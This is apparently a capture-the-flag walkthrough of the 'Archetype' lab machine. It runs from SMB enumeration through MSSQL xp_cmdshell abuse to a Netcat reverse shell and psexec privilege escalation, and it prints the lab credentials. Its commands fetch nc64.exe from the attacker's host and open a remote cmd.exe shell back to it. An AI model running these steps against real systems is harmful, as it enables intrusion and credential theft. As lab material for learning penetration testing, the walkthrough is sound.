## Enumerating Services

command: `nmap -sC -sV -p 1-1000 [Target-IP] > nmap.txt`

```text
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

smb-security-mode: 
   account_used: guest
   authentication_level: user
   challenge_response: supported
   message_signing: disabled (dangerous, but default)

```
The primary target is SMB because it allows guest access, whereas other services require specific credentials.

## SMB Exploration
command: `smbclient //[Target-IP]/backups -I [Target-IP]`
```bash
smb: \> ls (found prod.dtsConfig)
smb: \> get prod.dtsConfig (get is used to transfer it on my machine)
```
**Notes:**

- Samba doesn't have a `cat` command; you have to download the file to read it.
    
- Sometimes it's better to pivot and leverage a different service than to get stuck on one approach.

**Findings from the file:**

- Password for MySQL: `M3g4c0rp123`
    
- User-ID: `ARCHETYPE\sql_svc`

## Interact with Database
Googled "Impacket and MSSQL interactive script" and found `mssqlclient.py`.

Used it in the terminal:
```bash
impacket-mssqlclient -windows-auth -show 'ARCHETYPE/sql_svc@[Target-IP]'
password: # password entered 
SQL> EXEC sp_configure "show advanced options", 1;
> Advanced options changed value 0 to 1
SQL> RECONFIGURE;
>RECONFIGURED;
SQL> EXEC sp_configure "xp_cmdshell",1;
>xp_cmdshell changed value 0 to 1
SQL> RECONFIGURE;
>RECONFIGURE;
```
## Execute PowerShell through xp_cmdshell
Checking whoami and current directory:
```bash
SQL> xp_cmdshell 'powershell -c whoami'
>archetype\sql_svc
SQL> xp_cmdshell 'powershell -c pwd'
>C:\Windows\system32
```
Started a Python HTTP server in my `htb/archetype` directory to transfer `nc64.exe` for a proper shell.
```bash
SQL> xp_cmdshell 'powershell -c cd C:\Users\sql_svc\Downloads; wget http://[my-machine-vpn-ip]:[port]/nc64.exe -OutFile nc64.exe'
>Null
SQL> xp_cmdshell 'powershell -c dir C:\Users\sql_svc\Downloads'
>[size-of-file] nc64.exe
```
Setting up listener `nc -lvnp [port]` on my machine to catch the shell:
```bash
SQL> xp_cmdshell 'powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe [my-machine-vpn-ip] [port]'
```
Found `user.txt` at `C:\Users\sql_svc\Desktop`
## Privilege Escalation 
Checked the PowerShell history file to find the admin password..
```powershell
C:\Users\sql_svc\Desktop> cd ..
C:\Users\sql_svc> dir /s [to find all directories and subdirectories]
C:\Users\sql_svc> cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
found ConsoleHost_history.txt file
```
Found the admin password in `ConsoleHost_history.txt`: `MEGACORP_4dm1n!!`

Used `psexec` to login as admin:
```powershell
impacket-psexec ARCHETYPE/administrator@[target-ip]
password: [founded from history file]
C:\windows\system32> whoami
nt authority\system
C:\windows\system32> cd C:\Users\Administrator\Desktop
found root.txt
C:\windows\system32> type root.txt
found our flag here
```
## learning:
- PowerShell commands generally don't use single quotes in this context.
    
- Default PowerShell history is kept in `ConsoleHost_history.txt` at `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine`. Always check this for credentials.
    
- Admin pass was `MEGACORP_4dm1n!!`.
    
- Always look for alternative ways to reach the objective if the first path is blocked.
